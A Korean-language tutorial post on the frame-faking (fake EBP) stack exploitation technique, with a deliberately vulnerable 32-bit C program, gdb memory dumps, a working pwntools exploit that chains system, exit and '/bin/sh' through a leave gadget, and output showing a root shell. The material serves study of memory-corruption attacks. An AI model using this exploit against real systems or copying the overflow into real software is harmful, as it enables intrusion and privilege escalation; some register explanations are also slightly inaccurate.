---
title: Frame Faking
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, frame faking, fake ebp]
math: true
mermaid: true
---

## Description

가짜 스택 프레임 포인터(Stack Frame Pointer)를 만들어 프로그램의 실행 흐름을 변경한다. return address 영역 까지만 덮어쓸 수 있을 경우 사용한다. fake EBP라고도 한다.

### LEAVE

EBP 레지스터에 저장된 값을 ESP에 저장 후 ESP 레지스터가 가리키는 stack 영역에 값을 EBP 레지스터에 저장한다.

### RET

EBP 레지스터가 가리키는 stack 영역의 값을 RIP 레지스터에 저장 후 JMP 명령을 통해 RIP에 저장된 영역으로 이동한다.

```
; LEAVE
mov esp,ebp
pop ebp

; RET
pop eip
jmp eip
```

## Proof of concept

```c
// Vuln Code
// gcc -m32 -fno-stack-protector -o ff ff.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
 
void vuln(){
    char buf[50];
    printf("buf[50] address : %p\n",buf);
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 70);
}
  
void main(){
    vuln();
}
```

"A"66+"B"4 입력 시 vuln() 함수의 stack frame과 return address가 변조된다.

```
gdb-peda$ x/24wx $ebp
0xbfe98a78: 0x41414141  0x42424242  0xb7f233dc  0xbfe98aa0
```

**변조된 메모리 구조**

```
gdb-peda$ x/24wx 0xbfc64e3a(&buf)
0xbfc64e3a: 0x41414141 <- dummy 0x42424242 <- &system 0x43434343 <- &exit 0x44444444 <- &/bin/sh
gdb-peda$ x/24 $ebp
0xbfc64e78: 0x46464646 <- &buf  0x47474747 <- leave 0xb7f243dc  0xbfc64ea0
```

## Exploit code

```python
# Exploit Code
from pwn import *
import sys

p=process("./ff")
buf = int(p.recvline().split(' ')[3],16)
printf = int(p.recvline().split(' ')[3],16)

print('Laek buf    : ' + str(hex(buf)))
print('Laek printf : ' + str(hex(printf)))

libBase = printf - 0x4a670
system = libBase + 0x3bda0
exit = libBase + 0x2f9d0
binsh = libBase + 0x15ca0b
leave = 0x08048571

print('libBase : ' + str(hex(libBase)))
print('system  : ' + str(hex(system)))
print('exit    : ' + str(hex(exit)))
print('/bin/sh : ' + str(hex(binsh)))

exploit = "AAAA" + p32(system) + p32(exit) + p32(binsh) + "A"*46 + p32(buf) + p32(leave)
p.sendline(exploit)

p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/fakeebp# python exploit.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './fakeebp': pid 2319
Laek buf    : 0xbfd77fea
Laek printf : 0xb7e02670

libBase : 0xb7db8000
system  : 0xb7df3da0
exit    : 0xb7de79d0
/bin/sh : 0xb7f14a0b
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Refereces
- [04.Frame faking(Fake ebp)](https://www.lazenca.net/pages/viewpage.action?pageId=12189944)